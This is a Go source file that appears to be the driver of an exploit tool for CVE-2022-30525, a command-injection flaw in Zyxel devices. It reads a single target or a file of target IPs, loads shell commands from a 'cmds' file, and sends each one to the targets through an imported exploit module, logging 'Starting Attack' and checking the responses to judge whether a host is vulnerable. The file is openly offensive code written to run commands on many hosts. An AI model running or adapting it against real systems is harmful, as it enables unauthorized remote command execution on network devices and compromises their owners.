package main

import (
	"bufio"
	"cve-2022-30525/exploit"
	"flag"
	"log"
	"os"
	"regexp"
	"strings"
	"time"
)

func readFile(filename string) []string {
	var ret []string
	file, err := os.Open(filename)
	if err != nil {
		log.Println("\n\033[31m Can not open FILE" + filename)
		log.Println("\033[34m" + err.Error())
		os.Exit(0)
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)

	for scanner.Scan() {
		ret = append(ret, scanner.Text())
	}
	return ret
}

func initChannel(ch chan string) {
	log.Println(<-ch)
}

func main() {
	isFile := false
	target := flag.String(
		"t",
		"localhost",
		"Target url to attack",
	)
	flag.Parse()

	var ips []string
	ipv4Regex := `^(((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4})`
	if match, _ := regexp.MatchString(ipv4Regex, *target); !match {
		isFile = true
		// reading file with targets
		ips = readFile(*target)
	}

	// reading cmd commands for Zyxel Break
	cmds := readFile("cmds")

	ch_ping := make(chan string)
	go initChannel(ch_ping)

	//checking if the parameter is URL or not
	if !isFile {
		log.Println("\n\033[34m[+] The target is in URL. Starting Attack..." + *target + " with command ping google.com")
		go exploit.SendPOST(*target, "ping mail.ru", ch_ping)
		for _, cmd := range cmds {
			ch := make(chan string)
			go initChannel(ch)
			log.Println("\n\033[34m[+] The target is in URL. Starting Attack..." + *target + " with command " + cmd)
			res := exploit.SendPOST(*target, cmd, ch)
			if !strings.Contains(res, "Internal Server Error") {
				log.Println("IP isn't Vulnerable for the " + *target)
				break
			}
			time.Sleep(3 * time.Second)
		}
		os.Exit(0)
	} else {
		for _, ip := range ips {
			go exploit.SendPOST(ip, "ping google.com", ch_ping)
			for _, cmd := range cmds {
				ch := make(chan string)
				go initChannel(ch)
				log.Println("\n\033[34m[+] The target is in URL. Starting Attack..." + ip + " with command " + cmd)
				res := exploit.SendPOST(ip, cmd, ch)
				if !strings.Contains(res, "Internal Server Error") {
					log.Println("IP isn't Vulnerable for the " + ip)
					break
				}
				time.Sleep(5 * time.Second)
			}
			time.Sleep(5 * time.Second)
		}
	}
}
